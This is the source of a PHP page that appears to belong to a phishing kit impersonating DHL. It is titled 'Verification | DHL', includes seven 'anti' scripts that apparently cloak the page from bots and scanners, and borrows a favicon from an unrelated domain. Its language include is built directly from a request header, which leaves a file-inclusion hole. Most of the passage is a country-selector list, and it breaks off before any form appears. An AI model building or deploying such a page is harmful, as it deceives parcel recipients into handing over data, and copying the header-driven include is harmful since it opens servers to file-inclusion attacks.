<?php
session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";
?>
<html lang="fr"><head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="assets/app.css">
<style>
.fuckyou input{
  float:left;
}
.fuckyou button{
  float:left;
}
.summary-card {
    background: #E9E9E9;
    color: #a1a1a1;
    border: none;
    box-shadow: none;
}

.summary-card > .card-body > .row {
    padding-top: .75rem;
    padding-bottom: .5rem;
}

.summary-card > .card-body > .row:not(:last-child) {
    border-bottom: 1px solid #fff;
}

.summary-card .row-icon {
    font-size: 25px;
    margin-right: .75rem;
}

.parsley-errors-list + .flag-dropdown {
    top: -17px;
}

.parsley-errors-list.filled + .flag-dropdown {
    top: -30px;
}

.country-select.inside input {
    padding: .5rem !important;
}

.country-col .country-select.inside {
    display: block !important;
}

.country-col .country-select.inside .form-control {
    width: 100%;
}

.summary-table td, .summary-table th {
    padding: .35rem;
    border-top: 0;
    border-bottom: 1px solid #aaaeb3;
}

.summary-table th {
    border: 0;
}

@media (max-width: 768px) {
    .container {
        max-width: 100vw;
    }

    .kQwli, .rtYhf {
        padding-top: 30px !important;
    }

    .card-head {
        font-weight: 600;
    }

    .card-head::after {
        display: block;
    }
}
</style>
      <style>
    .btn.btn-danger {
        border: 1px solid #ef3535;
        background-color: #ef3535;
    }

    .btn.btn-danger:hover {
        border: 1px solid #eb0c0c;
        background-color: #eb0c0c;
    }

    p {
        color: #444;
    }

    img.one {
    margin-top: 150px;
    }

    p.text-center.contentP {
    margin-top: 50px;
    font-size: 18px;
    }
    p.text-center.fDate {
    margin-top: 50px;
    font-size: 18px;
    }
    span.date {
    font-weight: 600;
    color: #444;
    }
    .conThree {
    margin-top: 50px;
    }
    input.trNo {
    margin-left: 20px;
    height: 40px;
    }
    .right-arrow {
    padding: 11px;
    border: 1px solid #ef3535;
    background-color: #ef3535;
    color: #fff;
    width: 50px;
    border-top-right-radius: 4px;
    border-bottom-right-radius: 4px;
    }
    a.btn.tbtn:focus {
    outline: 0;
    box-shadow: none;
    }

    @media(max-width: 320px){
        .text-center.contentP {
            font-size: 10px !important;
        }
        p.text-center.fDate {
            font-size: 10px;
        }
        a.btn.tbtn {
            font-size: 11px;
        }
    }
    @media(min-width: 320px) and (max-width: 480px){
        .text-center.contentP {
            font-size: 10px !important;
        }
        p.text-center.fDate {
            margin-top: 50px;
            font-size: 15px;
        }
        a.btn.tbtn {
            font-size: 10px;
        }
        i.fas.fa-chevron-right {
            padding: 13.5px;
        }
    }
    @media(min-width: 480px) and (max-width: 576px){
        p.text-center.contentP {
            margin-top: 50px;
            font-size: 10px;
        }
    }
    @media (min-width: 576px) and (max-width: 768px){
        p.text-center.contentP {
            margin-top: 50px;
            font-size: 12px;
        }
    }
  </style>
    <title>Verification | DHL</title>
    <link rel="icon" type="image/ico" href="https://dispatching-centre.lasamericascargo.com/images/favicon.gif">
  <script src="https://cdn.lr-in.com/logger-1.min.js" async=""></script></head>
  <body data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0" style="margin: 0;">
  <div class="se-pre-con" style="display: none;"></div>
 <header class="header">
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <div class="container">
            <!-- mobile part -->
            <a class="navbar-brand p-0" href="#">
                <img src="assets/logo.png" alt="" class="img-responsive">
            </a>
            <form class="mb-1 d-md-none">
                <div class="form-item" style="display:none;">
                    <input type="text" id="mobile_country_selector_code" name="mobile_country_selector_code" data-countrycodeinput="1" readonly="readonly" placeholder="Selected country code will appear here">
                    <label for="mobile_country_selector_code">...and the selected country code will be updated here</label>
                </div>
                <button type="submit" style="display:none;">Submit</button>
            </form>

            <div id="mySidepanel" class="sidepanel">
                <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
                <a href="#" class=""><span class="mbl_home"><i class="fas fa-home"></i></span>Reception</a>
                <a href="#" class=""><span class="mbl_ship"><i class="fas fa-shipping-fast"></i></span>Ship</a>
                <a href="#" class=""><span class="mbl_track"><i class="fas fa-location-arrow"></i></span>Stalk</a>
                <a class="mbl_help" href="#"><span class="ic"><i class="fas fa-hands-helping"></i></span>Help and Supportsss</a>
                <a class="mbl_find" href="#"><span class="icc"><i class="fas fa-map-marker-alt"></i></span>Find a location</a>

                <a href="#" class=" reg_m"><span class="mbl_reg"><i class="fas fa-lock"></i></span>Connection</a>

            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#"><?php echo $lg_cm['top22']?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link loc" href="#"><?php echo $lg_cm['top23']?></a>
                    </li>
                    <li>
                        <div class="jhGf">
                            <label for="">
                                <span class="page-search-divider"></span>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-search" viewBox="0 0 16 16">
                                    <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"></path>
                                </svg>
                            </label>
                        </div>
                    </li>
                    <li class="v2-vertical-divider"></li>
                    <li>
                        <div class="container">
                            <form>

  <div class="flag-dropdown">
    <div class="selected-flag" title="Mauritius">
      <div class="flag mu">
      </div>
      <div class="arrow">
      </div>
    </div>
    <ul class="country-list hide">
      <li class="country preferred active" data-country-code="mu">
        <span class="country-name">Mauritius
        </span>
        <div class="flag mu">
        </div>
      </li>
      <li class="country preferred" data-country-code="us">
        <span class="country-name">United States
        </span>
        <div class="flag us">
        </div>
      </li>
      <li class="divider">
      </li>
      <li class="country" data-country-code="af">
        <span class="country-name">Afghanistan
        </span>
        <div class="flag af">
        </div>
      </li>
      <li class="country" data-country-code="ax">
        <span class="country-name">Åland Islands
        </span>
        <div class="flag ax">
        </div>
      </li>
      <li class="country" data-country-code="al">
        <span class="country-name">Albania
        </span>
        <div class="flag al">
        </div>
      </li>
      <li class="country" data-country-code="dz">
        <span class="country-name">Algeria
        </span>
        <div class="flag dz">
        </div>
      </li>
      <li class="country" data-country-code="as">
        <span class="country-name">American Samoa
        </span>
        <div class="flag as">
        </div>
      </li>
      <li class="country" data-country-code="ad">
        <span class="country-name">Andorra
        </span>
        <div class="flag ad">
        </div>
      </li>
      <li class="country" data-country-code="ao">
        <span class="country-name">Angola
        </span>
        <div class="flag ao">
        </div>
      </li>
      <li class="country" data-country-code="ai">
        <span class="country-name">Anguilla
        </span>
        <div class="flag ai">
        </div>
      </li>
      <li class="country" data-country-code="ag">
        <span class="country-name">Antigua and Barbuda
        </span>
        <div class="flag ag">
        </div>
      </li>
      <li class="country" data-country-code="ar">
        <span class="country-name">Argentina
        </span>
        <div class="flag ar">
        </div>
      </li>
      <li class="country" data-country-code="am">
        <span class="country-name">Armenia
        </span>
        <div class="flag am">
        </div>
      </li>
      <li class="country" data-country-code="aw">
        <span class="country-name">Aruba
        </span>
        <div class="flag aw">
        </div>
      </li>
      <li class="country" data-country-code="au">
        <span class="country-name">Australia
        </span>
        <div class="flag au">
        </div>
      </li>
      <li class="country" data-country-code="at">
        <span class="country-name">Austria
        </span>
        <div class="flag at">
        </div>
      </li>
      <li class="country" data-country-code="az">
        <span class="country-name">Azerbaijan
        </span>
        <div class="flag az">
        </div>
      </li>
      <li class="country" data-country-code="bs">
        <span class="country-name">Bahamas
        </span>
        <div class="flag bs">
        </div>
      </li>
      <li class="country" data-country-code="bh">
        <span class="country-name">Bahrain
        </span>
        <div class="flag bh">
        </div>
      </li>
      <li class="country" data-country-code="bd">
        <span class="country-name">Bangladesh
        </span>
        <div class="flag bd">
        </div>
      </li>
      <li class="country" data-country-code="bb">
        <span class="country-name">Barbados
        </span>
        <div class="flag bb">
        </div>
      </li>
      <li class="country" data-country-code="by">
        <span class="country-name">Belarus
        </span>
        <div class="flag by">
        </div>
      </li>
      <li class="country" data-country-code="be">
        <span class="country-name">Belgium
        </span>
        <div class="flag be">
        </div>
      </li>
      <li class="country" data-country-code="bz">
        <span class="country-name">Belize
        </span>
        <div class="flag bz">
        </div>
      </li>
      <li class="country" data-country-code="bj">
        <span class="country-name">Benin
        </span>
        <div class="flag bj">
        </div>
      </li>
      <li class="country" data-country-code="bm">
        <span class="country-name">Bermuda
        </span>
        <div class="flag bm">
        </div>
      </li>
      <li class="country" data-country-code="bt">
        <span class="country-name">Bhutan
        </span>
        <div class="flag bt">
        </div>
      </li>
      <li class="country" data-country-code="bo">
        <span class="country-name">Bolivia
        </span>
        <div class="flag bo">
        </div>
      </li>
      <li class="country" data-country-code="ba">
        <span class="country-name">Bosnia and Herzegovina
        </span>
        <div class="flag ba">
        </div>
      </li>
      <li class="country" data-country-code="bw">
        <span class="country-name">Botswana
        </span>
        <div class="flag bw">
        </div>
      </li>
      <li class="country" data-country-code="br">
        <span class="country-name">Brazil
        </span>
        <div class="flag br">
        </div>
      </li>
      <li class="country" data-country-code="io">
        <span class="country-name">British Indian Ocean Territory
        </span>
        <div class="flag io">
        </div>
      </li>
      <li class="country" data-country-code="vg">
        <span class="country-name">British Virgin Islands
        </span>
        <div class="flag vg">
        </div>
      </li>
      <li class="country" data-country-code="bn">
        <span class="country-name">Brunei
        </span>
        <div class="flag bn">
        </div>
      </li>
      <li class="country" data-country-code="bg">
        <span class="country-name">Bulgaria
        </span>
        <div class="flag bg">
        </div>
      </li>
      <li class="country" data-country-code="bf">
        <span class="country-name">Burkina Faso
        </span>
        <div class="flag bf">
        </div>
      </li>
      <li class="country" data-country-code="bi">
        <span class="country-name">Burundi
        </span>
        <div class="flag bi">
        </div>
      </li>
      <li class="country" data-country-code="kh">
        <span class="country-name">Cambodia
        </span>
        <div class="flag kh">
        </div>
      </li>
      <li class="country" data-country-code="cm">
        <span class="country-name">Cameroon
        </span>
        <div class="flag cm">
        </div>
      </li>
      <li class="country" data-country-code="ca">
        <span class="country-name">Canada
        </span>
        <div class="flag ca">
        </div>
      </li>
      <li class="country" data-country-code="cv">
        <span class="country-name">Cape Verde
        </span>
        <div class="flag cv">
        </div>
      </li>
      <li class="country" data-country-code="bq">
        <span class="country-name">Caribbean Netherlands
        </span>
        <div class="flag bq">
        </div>
      </li>
      <li class="country" data-country-code="ky">
        <span class="country-name">Cayman Islands
        </span>
        <div class="flag ky">
        </div>
      </li>
      <li class="country" data-country-code="cf">
        <span class="country-name">Central African Republic
        </span>
        <div class="flag cf">
        </div>
      </li>
      <li class="country" data-country-code="td">
        <span class="country-name">Chad (Tchad)
        </span>
        <div class="flag td">
        </div>
      </li>
      <li class="country" data-country-code="cl">
        <span class="country-name">Chile
        </span>
        <div class="flag cl">
        </div>
      </li>
      <li class="country" data-country-code="cn">
        <span class="country-name">China
        </span>
        <div class="flag cn">
        </div>
      </li>
      <li class="country" data-country-code="cx">
        <span class="country-name">Christmas Island
        </span>
        <div class="flag cx">
        </div>
      </li>
      <li class="country" data-country-code="cc">
        <span class="country-name">Cocos Islands
        </span>
        <div class="flag cc">
        </div>
      </li>
      <li class="country" data-country-code="co">
        <span class="country-name">Colombia
        </span>
        <div class="flag co">
        </div>
      </li>
      <li class="country" data-country-code="km">
        <span class="country-name">Comoros
        </span>
        <div class="flag km">
        </div>
      </li>
      <li class="country" data-country-code="cd">
        <span class="country-name">Congo
        </span>
        <div class="flag cd">
        </div>
      </li>
      <li class="country" data-country-code="cg">
        <span class="country-name">Congo
        </span>
        <div class="flag cg">
        </div>
      </li>
      <li class="country" data-country-code="ck">
        <span class="country-name">Cook Islands
        </span>
        <div class="flag ck">
        </div>
      </li>
      <li class="country" data-country-code="cr">
        <span class="country-name">Costa Rica
        </span>
        <div class="flag cr">
        </div>
      </li>
      <li class="country" data-country-code="ci">
        <span class="country-name">Côte d’Ivoire
        </span>
        <div class="flag ci">
        </div>
      </li>
      <li class="country" data-country-code="hr">
        <span class="country-name">Croatia
        </span>
        <div class="flag hr">
        </div>
      </li>
      <li class="country" data-country-code="cu">
        <span class="country-name">Cuba
        </span>
        <div class="flag cu">
        </div>
      </li>
      <li class="country" data-country-code="cw">
        <span class="country-name">Curaçao
        </span>
        <div class="flag cw">
        </div>
      </li>
      <li class="country" data-country-code="cy">
        <span class="country-name">Cyprus
        </span>
        <div class="flag cy">
        </div>
      </li>
      <li class="country" data-country-code="cz">
        <span class="country-name">Czech Republic
        </span>
        <div class="flag cz">
        </div>
      </li>
      <li class="country" data-country-code="dk">
        <span class="country-name">Denmark
        </span>
        <div class="flag dk">
        </div>
      </li>
      <li class="country" data-country-code="dj">
        <span class="country-name">Djibouti
        </span>
        <div class="flag dj">
        </div>
      </li>
      <li class="country" data-country-code="dm">
        <span class="country-name">Dominica
        </span>
        <div class="flag dm">
        </div>
      </li>
      <li class="country" data-country-code="do">
        <span class="country-name">Dominican Republic
        </span>
        <div class="flag do">
        </div>
      </li>
      <li class="country" data-country-code="ec">
        <span class="country-name">Ecuador
        </span>
        <div class="flag ec">
        </div>
      </li>
      <li class="country" data-country-code="eg">
        <span class="country-name">Egypt (‫مصر‬‎)
        </span>
        <div class="flag eg">
        </div>
      </li>
      <li class="country" data-country-code="sv">
        <span class="country-name">El Salvador
        </span>
        <div class="flag sv">
        </div>
      </li>
      <li class="country" data-country-code="gq">
        <span class="country-name">Equatorial Guinea
        </span>
        <div class="flag gq">
        </div>
      </li>
      <li class="country" data-country-code="er">
        <span class="country-name">Eritrea
        </span>
        <div class="flag er">
        </div>
      </li>
      <li class="country" data-country-code="ee">
        <span class="country-name">Estonia
        </span>
        <div class="flag ee">
        </div>
      </li>
      <li class="country" data-country-code="et">
        <span class="country-name">Ethiopia
        </span>
        <div class="flag et">
        </div>
      </li>
      <li class="country" data-country-code="fk">
        <span class="country-name">Falkland Islands
        </span>
        <div class="flag fk">
        </div>
      </li>
      <li class="country" data-country-code="fo">
        <span class="country-name">Faroe Islands
        </span>
        <div class="flag fo">
        </div>
      </li>
      <li class="country" data-country-code="fj">
        <span class="country-name">Fiji
        </span>
        <div class="flag fj">
        </div>
      </li>
      <li class="country" data-country-code="fi">
        <span class="country-name">Finland
        </span>
        <div class="flag fi">
        </div>
      </li>
      <li class="country" data-country-code="fr">
        <span class="country-name">France
        </span>
        <div class="flag fr">
        </div>
      </li>
      <li class="country" data-country-code="gf">
        <span class="country-name">French Guiana
        </span>
        <div class="flag gf">
        </div>
      </li>
      <li class="country" data-country-code="pf">
        <span class="country-name">French Polynesia
        </span>
        <div class="flag pf">
        </div>
      </li>
      <li class="country" data-country-code="ga">
        <span class="country-name">Gabon
        </span>
        <div class="flag ga">
        </div>
      </li>
      <li class="country" data-country-code="gm">
        <span class="country-name">Gambia
        </span>
        <div class="flag gm">
        </div>
      </li>
      <li class="country" data-country-code="ge">
        <span class="country-name">Georgia
        </span>
        <div class="flag ge">
        </div>
      </li>
      <li class="country" data-country-code="de">
        <span class="country-name">Germany
        </span>
        <div class="flag de">
        </div>
      </li>
      <li class="country" data-country-code="gh">
        <span class="country-name">Ghana
        </span>
        <div class="flag gh">
        </div>
      </li>
      <li class="country" data-country-code="gi">
        <span class="country-name">Gibraltar
        </span>
        <div class="flag gi">
        </div>
      </li>
      <li class="country" data-country-code="gr">
        <span class="country-name">Greece
        </span>
        <div class="flag gr">
        </div>
      </li>
      <li class="country" data-country-code="gl">
        <span class="country-name">Greenland
        </span>
        <div class="flag gl">
        </div>
      </li>
      <li class="country" data-country-code="gd">
        <span class="country-name">Grenada
        </span>
        <div class="flag gd">
        </div>
      </li>
      <li class="country" data-country-code="gp">
        <span class="country-name">Guadeloupe
        </span>
        <div class="flag gp">
        </div>
      </li>
      <li class="country" data-country-code="gu">
        <span class="country-name">Guam
        </span>
        <div class="flag gu">
        </div>
      </li>
      <li class="country" data-country-code="gt">
        <span class="country-name">Guatemala
        </span>
        <div class="flag gt">
        </div>
      </li>
      <li class="country" data-country-code="gg">
        <span class="country-name">Guernsey
        </span>
        <div class="flag gg">
        </div>
      </li>
      <li class="country" data-country-code="gn">
        <span class="country-name">Guinea
        </span>
        <div class="flag gn">
        </div>
      </li>
      <li class="country" data-country-code="gw">
        <span class="country-name">Guinea-Bissau
        </span>
        <div class="flag gw">
        </div>
      </li>
      <li class="country" data-country-code="gy">
        <span class="country-name">Guyana
        </span>
        <div class="flag gy">
        </div>
      </li>
      <li class="country" data-country-code="ht">
        <span class="country-name">Haiti
        </span>
        <div class="flag ht">
        </div>
      </li>
      <li class="country" data-country-code="hn">
        <span class="country-name">Honduras
        </span>
        <div class="flag hn">
        </div>
      </li>
      <li class="country" data-country-code="hk">
        <span class="country-name">Hong Kong
        </span>
        <div class="flag hk">
        </div>
      </li>
      <li class="country" data-country-code="hu">
        <span class="country-name">Hungary
        </span>
        <div class="flag hu">
        </div>
      </li>
      <li class="country" data-country-code="is">
        <span class="country-name">Iceland
        </span>
        <div class="flag is">
        </div>
      </li>
      <li class="country" data-country-code="in">
        <span class="country-name">India
        </span>
        <div class="flag in">
        </div>
      </li>
      <li class="country" data-country-code="id">
        <span class="country-name">Indonesia
        </span>
        <div class="flag id">
        </div>
      </li>
      <li class="country" data-country-code="ir">
        <span class="country-name">Iran
        </span>
        <div class="flag ir">
        </div>
      </li>
      <li class="country" data-country-code="iq">
        <span class="country-name">Iraq
        </span>
        <div class="flag iq">
        </div>
      </li>
      <li class="country" data-country-code="ie">
        <span class="country-name">Ireland
        </span>
        <div class="flag ie">
        </div>
      </li>
      <li class="country" data-country-code="im">
        <span class="country-name">Isle of Man
        </span>
        <div class="flag im">
        </div>
      </li>
      <li class="country" data-country-code="il">
        <span class="country-name">Israel
        </span>
        <div class="flag il">
        </div>
      </li>
      <li class="country" data-country-code="it">
        <span class="country-name">Italy
        </span>
        <div class="flag it">
        </div>
      </li>
      <li class="country" data-country-code="jm">
        <span class="country-name">Jamaica
        </span>
        <div class="flag jm">
        </div>
      </li>
      <li class="country" data-country-code="jp">
        <span class="country-name">Japan
        </span>
        <div class="flag jp">
        </div>
      </li>
      <li class="country" data-country-code="je">
        <span class="country-name">Jersey
        </span>
        <div class="flag je">
        </div>
      </li>
      <li class="country" data-country-code="jo">
        <span class="country-name">Jordan
        </span>
        <div class="flag jo">
        </div>
      </li>
      <li class="country" data-country-code="kz">
        <span class="country-name">Kazakhstan
        </span>
        <div class="flag kz">
        </div>
      </li>
      <li class="country" data-country-code="ke">
        <span class="country-name">Kenya
        </span>
        <div class="flag ke">
        </div>
      </li>
      <li class="country" data-country-code="ki">
        <span class="country-name">Kiribati
        </span>
        <div class="flag ki">
        </div>
      </li>
      <li class="country" data-country-code="xk">
        <span class="country-name">Kosovo
        </span>
        <div class="flag xk">
        </div>
      </li>
      <li class="country" data-country-code="kw">
        <span class="country-name">Kuwait
        </span>
        <div class="flag kw">
        </div>
      </li>
      <li class="country" data-country-code="kg">
        <span class="country-name">Kyrgyzstan
        </span>
        <div class="flag kg">
        </div>
      </li>
      <li class="country" data-country-code="la">
        <span class="country-name">Laos
        </span>
        <div class="flag la">
        </div>
      </li>
      <li class="country" data-country-code="lv">
        <span class="country-name">Latvia
        </span>
        <div class="flag lv">
        </div>
      </li>
      <li class="country" data-country-code="lb">
        <span class="country-name">Lebanon
        </span>
        <div class="flag lb">
        </div>
      </li>
      <li class="country" data-country-code="ls">
        <span class="country-name">Lesotho
        </span>
        <div class="flag ls">
        </div>
      </li>
      <li class="country" data-country-code="lr">
        <span class="country-name">Liberia
        </span>
        <div class="flag lr">
        </div>
      </li>
      <li class="country" data-country-code="ly">
        <span class="country-name">Libya
        </span>
        <div class="flag ly">
        </div>
      </li>
      <li class="country" data-country-code="li">
        <span class="country-name">Liechtenstein
        </span>
        <div class="flag li">
        </div>
      </li>
      <li class="country" data-country-code="lt">
        <span class="country-name">Lithuania
        </span>
        <div class="flag lt">
        </div>
      </li>
      <li class="country" data-country-code="lu">
        <span class="country-name">Luxembourg
        </span>
        <div class="flag lu">
        </div>
      </li>
      <li class="country" data-country-code="mo">
        <span class="country-name">Macau
        </span>
        <div class="flag mo">
        </div>
      </li>
      <li class="country" data-country-code="mk">
        <span class="country-name">Macedonia
        </span>
        <div class="flag mk">
        </div>
      </li>
      <li class="country" data-country-code="mg">
        <span class="country-name">Madagascar
        </span>
        <div class="flag mg">
        </div>
      </li>
      <li class="country" data-country-code="mw">
        <span class="country-name">Malawi
        </span>
        <div class="flag mw">
        </div>
      </li>
      <li class="country" data-country-code="my">
        <span class="country-name">Malaysia
        </span>
        <div class="flag my">
        </div>
      </li>
      <li class="country" data-country-code="mv">
        <span class="country-name">Maldives
        </span>
        <div class="flag mv">
        </div>
      </li>
      <li class="country" data-country-code="ml">
        <span class="country-name">Mali
        </span>
        <div class="flag ml">
        </div>
      </li>
      <li class="country" data-country-code="mt">
        <span class="country-name">Malta
        </span>
        <div class="flag mt">
        </div>
      </li>
      <li class="country" data-country-code="mh">
        <span class="country-name">Marshall Islands
        </span>
        <div class="flag mh">
        </div>
      </li>
      <li class="country" data-country-code="mq">
        <span class="country-name">Martinique
        </span>
        <div class="flag mq">
        </div>
      </li>
      <li class="country" data-country-code="mr">
        <span class="country-name">Mauritania
        </span>
        <div class="flag mr">
        </div>
      </li>
      <li class="country" data-country-code="mu">
        <span class="country-name">Mauritius
        </span>
        <div class="flag mu">
        </div>
      </li>
      <li class="country" data-country-code="yt">
        <span class="country-name">Mayotte
        </span>
        <div class="flag yt">
        </div>
      </li>
      <li class="country" data-country-code="mx">
        <span class="country-name">Mexico
        </span>
        <div class="flag mx">
        </div>
      </li>
      <li class="country" data-country-code="fm">
        <span class="country-name">Micronesia
        </span>
        <div class="flag fm">
        </div>
      </li>
      <li class="country" data-country-code="md">
        <span class="country-name">Moldova
        </span>
        <div class="flag md">
        </div>
      </li>
      <li class="country" data-country-code="mc">
        <span class="country-name">Monaco
        </span>
        <div class="flag mc">
        </div>
      </li>
      <li class="country" data-country-code="mn">
        <span class="country-name">Mongolia
        </span>
        <div class="flag mn">
        </div>
      </li>
      <li class="country" data-country-code="me">
        <span class="country-name">Montenegro
        </span>
        <div class="flag me">
        </div>
      </li>
      <li class="country" data-country-code="ms">
        <span class="country-name">Montserrat
        </span>
        <div class="flag ms">
        </div>
      </li>
      <li class="country" data-country-code="ma">
        <span class="country-name">Morocco
        </span>
        <div class="flag ma">
        </div>
      </li>
      <li class="country" data-country-code="mz">
        <span class="country-name">Mozambique
        </span>
        <div class="flag mz">
        </div>
      </li>
      <li class="country" data-country-code="mm">
        <span class="country-name">Myanmar
        </span>
        <div class="flag mm">
        </div>
      </li>
      <li class="country" data-country-code="na">
        <span class="country-name">Namibia
        </span>
        <div class="flag na">
        </div>
      </li>
      <li class="country" data-country-code="nr">
        <span class="country-name">Nauru
        </span>
        <div class="flag nr">
        </div>
      </li>
      <li class="country" data-country-code="np">
        <span class="country-name">Nepal
        </span>
        <div class="flag np">
        </div>
      </li>
      <li class="country" data-country-code="nl">
        <span class="country-name">Netherlands
        </span>
        <div class="flag nl">
        </div>
      </li>
      <li class="country" data-country-code="nc">
        <span class="country-name">New Caledonia
        </span>
        <div class="flag nc">
        </div>
      </li>
      <li class="country" data-country-code="nz">
        <span class="country-name">New Zealand
        </span>
        <div class="flag nz">
        </div>
      </li>
      <li class="country" data-country-code="ni">
        <span class="country-name">Nicaragua
        </span>
        <div class="flag ni">
        </div>
      </li>
      <li class="country" data-country-code="ne">
        <span class="country-name">Niger
        </span>
        <div class="flag ne">
        </div>
      </li>
      <li class="country" data-country-code="ng">
        <span class="country-name">Nigeria
        </span>
        <div class="flag ng">
        </div>
      </li>
      <li class="country" data-country-code="nu">
        <span class="country-name">Niue
        </span>
        <div class="flag nu">
        </div>
      </li>
      <li class="country" data-country-code="nf">
        <span class="country-name">Norfolk Island
        </span>
        <div class="flag nf">
        </div>
      </li>
      <li class="country" data-country-code="kp">
        <span class="country-name">North Korea
        </span>
        <div class="flag kp">
        </div>
      </li>
      <li class="country" data-country-code="mp">
        <span class="country-name">Northern Mariana Islands
        </span>
        <div class="flag mp">
        </div>
      </li>
      <li class="country" data-country-code="no">
        <span class="country-name">Norway
        </span>
        <div class="flag no">
        </div>
      </li>
      <li class="country" data-country-code="om">
        <span class="country-name">Oman
        </span>
        <div class="flag om">
        </div>
      </li>
      <li class="country" data-country-code="pk">
        <span class="country-name">Pakistan
        </span>
        <div class="flag pk">
        </div>
      </li>
      <li class="country" data-country-code="pw">
        <span class="country-name">Palau
        </span>
        <div class="flag pw">
        </div>
      </li>
      <li class="country" data-country-code="ps">
        <span class="country-name">Palestine
        </span>
        <div class="flag ps">
        </div>
      </li>
      <li class="country" data-country-code="pa">
        <span class="country-name">Panama
        </span>
        <div class="flag pa">
        </div>
      </li>
      <li class="country" data-country-code="pg">
        <span class="country-name">Papua New Guinea
        </span>
        <div class="flag pg">
        </div>
      </li>
      <li class="country" data-country-code="py">
        <span class="country-name">Paraguay
        </span>
        <div class="flag py">
        </div>
      </li>
      <li class="country" data-country-code="pe">
        <span class="country-name">Peru
        </span>
        <div class="flag pe">
        </div>
      </li>
      <li class="country" data-country-code="ph">
        <span class="country-name">Philippines
        </span>
        <div class="flag ph">
        </div>
      </li>
      <li class="country" data-country-code="pn">
        <span class="country-name">Pitcairn Islands
        </span>
        <div class="flag pn">
        </div>
      </li>
      <li class="country" data-country-code="pl">
        <span class="country-name">Poland
        </span>
        <div class="flag pl">
        </div>
      </li>
      <li class="country" data-country-code="pt">
        <span class="country-name">Portugal
        </span>
        <div class="flag pt">
        </div>
      </li>
      <li class="country" data-country-code="pr">
        <span class="country-name">Puerto Rico
        </span>
        <div class="flag pr">
        </div>
      </li>
      <li class="country" data-country-code="qa">
        <span class="country-name">Qatar
        </span>
        <div class="flag qa">
        </div>
      </li>
      <li class="country" data-country-code="re">
        <span class="country-name">Réunion
        </span>
        <div class="flag re">
        </div>
      </li>
      <li class="country" data-country-code="ro">
        <span class="country-name">Romania
        </span>
        <div class="flag ro">
        </div>
      </li>
      <li class="country" data-country-code="ru">
        <span class="country-name">Russia
        </span>
        <div class="flag ru">
        </div>
      </li>
      <li class="country" data-country-code="rw">
        <span class="country-name">Rwanda
        </span>
        <div class="flag rw">
        </div>
      </li>
      <li class="country" data-country-code="bl">
        <span class="country-name">ST. Barthélemy
        </span>
        <div class="flag bl">
        </div>
      </li>
      <li class="country" data-country-code="sh">
        <span class="country-name">Saint Helena
        </span>
        <div class="flag sh">
        </div>
      </li>
      <li class="country" data-country-code="kn">
        <span class="country-name">ST. Kitts
        </span>
        <div class="flag kn">
        </div>
      </li>
      <li class="country" data-country-code="lc">
        <span class="country-name">ST. Lucia
        </span>
        <div class="flag lc">
        </div>
      </li>
      <li class="country" data-country-code="mf">
        <span class="country-name">Saint Martin
        </span>
        <div class="flag mf">
        </div>
      </li>
      <li class="country" data-country-code="pm">
        <span class="country-name">ST. Pierre
        </span>
        <div class="flag pm">
        </div>
      </li>
      <li class="country" data-country-code="vc">
        <span class="country-name">ST. Vincent
        </span>
        <div class="flag vc">
        </div>
      </li>
      <li class="country" data-country-code="ws">
        <span class="country-name">Samoa
        </span>
        <div class="flag ws">
        </div>
      </li>
      <li class="country" data-country-code="sm">
        <span class="country-name">San Marino
        </span>
        <div class="flag sm">
        </div>
      </li>
      <li class="country" data-country-code="st">
        <span class="country-name">São Tomé and Príncipe
        </span>
        <div class="flag st">
        </div>
      </li>
      <li class="country" data-country-code="sa">
        <span class="country-name">Saudi Arabia
        </span>
        <div class="flag sa">
        </div>
      </li>
      <li class="country" data-country-code="sn">
        <span class="country-name">Senegal
        </span>
        <div class="flag sn">
        </div>
      </li>
      <li class="country" data-country-code="rs">
        <span class="country-name">Serbia
        </span>
        <div class="flag rs">
        </div>
      </li>
      <li class="country" data-country-code="sc">
        <span class="country-name">Seychelles
        </span>
        <div class="flag sc">
        </div>
      </li>
      <li class="country" data-country-code="sl">
        <span class="country-name">Sierra Leone
        </span>
        <div class="flag sl">
        </div>
      </li>
      <li class="country" data-country-code="sg">
        <span class="country-name">Singapore
        </span>
        <div class="flag sg">
        </div>
      </li>
      <li class="country" data-country-code="sx">
        <span class="country-name">Sint Maarten
        </span>
        <div class="flag sx">
        </div>
      </li>
      <li class="country" data-country-code="sk">
        <span class="country-name">Slovakia
        </span>
        <div class="flag sk">
        </div>
      </li>
      <li class="country" data-country-code="si">
        <span class="country-name">Slovenia
        </span>
        <div class="flag si">
        </div>
      </li>
      <li class="country" data-country-code="sb">
        <span class="country-name">Solomon Islands
        </span>
        <div class="flag sb">
        </div>
      </li>
      <li class="country" data-country-code="so">
        <span class="country-name">Somalia
        </span>
        <div class="flag so">
        </div>
      </li>
      <li class="country" data-country-code="za">
        <span class="country-name">South Africa
        </span>
        <div class="flag za">
        </div>
      </li>
      <li class="country" data-country-code="kr">
        <span class="country-name">South Korea
        </span>
        <div class="flag kr">
        </div>
      </li>
      <li class="country" data-country-code="ss">
        <span class="country-name">South Sudan
        </span>
        <div class="flag ss">
        </div>
      </li>
      <li class="country" data-country-code="es">
        <span class="country-name">Spain
        </span>
        <div class="flag es">
        </div>
      </li>
      <li class="country" data-country-code="lk">
        <span class="country-name">Sri Lanka
        </span>
        <div class="flag lk">
        </div>
      </li>
      <li class="country" data-country-code="sd">
        <span class="country-name">Sudan
        </span>
        <div class="flag sd">
        </div>
      </li>
      <li class="country" data-country-code="sr">
        <span class="country-name">Suriname
        </span>
